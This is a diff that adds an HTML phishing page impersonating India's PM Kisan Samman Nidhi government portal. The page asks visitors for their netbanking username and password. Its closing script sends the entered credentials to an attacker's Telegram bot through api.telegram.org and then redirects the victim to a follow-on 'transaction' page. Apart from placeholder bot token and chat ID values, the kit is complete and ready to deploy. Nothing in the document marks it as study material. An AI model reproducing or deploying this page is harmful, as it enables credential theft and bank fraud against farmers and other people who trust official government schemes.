@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netbanking Verification</title>
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.css"/>
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick-theme.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/datepicker/1.0.10/datepicker.min.css">
+    <style>
+        /* Top Header Styles */
+        .top-header {
+            background-color: white;
+            color: black;
+            padding: 10px 15px;
+            text-align: center;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .top-header h2 {
+            margin: 0;
+            font-size: 1.2rem;
+            font-weight: bold;
+        }
+
+        .top-header p {
+            margin: 5px 0;
+            font-size: 0.9rem;
+        }
+
+        .top-header a {
+            color: #1565c0;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+
+        .top-header a:hover {
+            text-decoration: underline;
+        }
+
+        /* General Styles */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f4f7;
+        }
+
+        /* Header Section */
+        .header {
+            background-color: #1565c0;
+            color: white;
+            padding: 10px 15px;
+            text-align: center;
+        }
+
+        .header h1 {
+            margin: 0;
+            font-size: 1.5rem;
+        }
+
+        .header p {
+            margin: 10px 0;
+            font-size: 0.9rem;
+        }
+
+        /* Left Image and Header Section */
+        .left-image-section {
+            display: flex;
+            align-items: center;
+            padding: 15px;
+            background-color: #1565c0;
+        }
+
+        .left-image-section img {
+            max-height: 100px;
+            margin-right: 20px;
+        }
+
+        .left-image-section-text {
+            color: white;
+        }
+
+        /* Main Content Section */
+        .main-content {
+            padding: 15px;
+        }
+
+        /* Form Section */
+        .netbanking-form {
+            background-color: #ffffff;
+            padding: 25px;
+            border-radius: 10px;
+            width: 40%;
+            margin: 20px auto;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .netbanking-form input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 1rem;
+        }
+
+        .netbanking-form input:focus {
+            border-color: #1565c0;
+            outline: none;
+        }
+
+        .netbanking-form button {
+            background-color: #1565c0;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 1rem;
+            transition: background-color 0.3s ease;
+        }
+
+        .netbanking-form button:hover {
+            background-color: #0044cc;
+        }
+
+        /* Processing Spinner */
+        .processing-spinner {
+            display: none;
+            margin: 20px auto;
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #1565c0;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Footer Section */
+        .footer {
+            background-color: rgb(0, 0, 0);
+            color: white;
+            padding: 15px;
+            text-align: center;
+        }
+
+        .footer-links {
+            margin-bottom: 10px;
+        }
+
+        .footer-links a {
+            color: white;
+            text-decoration: none;
+            font-size: 0.8rem;
+            margin: 0 5px;
+        }
+
+        .footer-text p {
+            font-size: 0.8rem;
+            margin: 5px 0;
+        }
+
+        .copyright p {
+            font-size: 0.8rem;
+            margin: 5px 0;
+        }
+
+        .mid-banner img {
+            max-width: 50%;
+            height: auto;
+            margin: 0 auto;
+            display: block;
+        }
+
+        /* Responsive Design for Mobile */
+        @media (max-width: 768px) {
+            .netbanking-form {
+                width: 80%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Top Header -->
+    <div class="top-header">
+        <h2>भारत सरकार | GOVERNMENT OF INDIA</h2>
+        <p>कृषि और किसान कल्याण मंत्रालय | MINISTRY OF AGRICULTURE & FARMERS WELFARE</p>
+        <a href="#main-content">Skip to Main Content</a>
+    </div>
+
+    <!-- Header Section -->
+    <header class="header">
+        <div class="left-image-section">
+            <img src="1image2.png" alt="PM Kisan Logo">
+            <div class="left-image-section-text">
+                <h1>PM Kisan Samman Nidhi</h1>
+                <p>Department of Agriculture and Farmers Welfare<br>Ministry of Agriculture and Farmers Welfare<br>Government of India</p>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content Section -->
+    <main class="main-content" id="main-content">
+        <div class="netbanking-form">
+            <h3>Netbanking Verification</h3>
+            <form id="netbankingForm" action="#" method="POST">
+                <!-- Username Field -->
+                <input type="text" id="username" name="username" placeholder="Enter Your Username" required><br>
+
+                <!-- Password Field -->
+                <input type="password" id="password" name="password" placeholder="Enter Your Password" required><br>
+
+                <!-- Verify Button -->
+                <button type="submit" id="verifyButton">Verify</button>
+
+                <!-- Processing Spinner -->
+                <div class="processing-spinner" id="processingSpinner"></div>
+            </form>
+        </div>
+    </main>
+
+    <!-- Footer Section -->
+    <footer class="footer">
+        <div class="mid-banner">
+            <img src="footer2.jpg" alt="Government of India Ministry of Agriculture Banner">
+        </div>
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#disclaimer">Disclaimer</a> | 
+                <a href="#terms">Terms and Conditions</a> | 
+                <a href="#privacy">Privacy Policy</a> | 
+                <a href="#copyright">Copyright Policy</a> | 
+                <a href="#linking">Hyperlinking Policy</a> | 
+                <a href="#accessibility">Accessibility</a>
+            </div>
+            <div class="footer-text">
+                <p>Privacy Policy For Mobile App</p>
+                <p>Site is designed and hosted by National Informatics Centre. Contents published and managed by Department of Agriculture, Cooperation & Farmers Welfare, Ministry of Agriculture and Farmers Welfare, Government of India.</p>
+                <p>Page Last Updated on : 09/02/2025</p>
+            </div>
+            <div class="mid-banner">
+                <img src="footer3.jpg" alt="Government of India Ministry of Agriculture Banner">
+            </div>
+            <div class="copyright">
+                <p>&copy; 2023 PM KISAN Samman Nidhi. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Function to send data to Telegram bot
+        function sendToTelegram(message) {
+            const botToken = 'YOUR_BOT_API_TOKEN'; // Replace with your bot token
+            const chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            return fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Data sent to Telegram:', data);
+                })
+                .catch(error => {
+                    console.error('Error sending data to Telegram:', error);
+                });
+        }
+
+        // Handle Form Submission
+        document.getElementById('netbankingForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // Prevent default form submission
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const spinner = document.getElementById('processingSpinner');
+
+            // Show spinner
+            spinner.style.display = 'block';
+
+            // Prepare message for Telegram
+            const message = `Netbanking Verification:\nUsername: ${username}\nPassword: ${password}`;
+
+            // Send data to Telegram and redirect
+            sendToTelegram(message)
+                .then(() => {
+                    window.location.href = 'transcation.html'; // Redirect to transaction page
+                })
+                .finally(() => {
+                    // Hide spinner (in case of error)
+                    spinner.style.display = 'none';
+                });
+        });
+    </script>
+</body>
+</html>
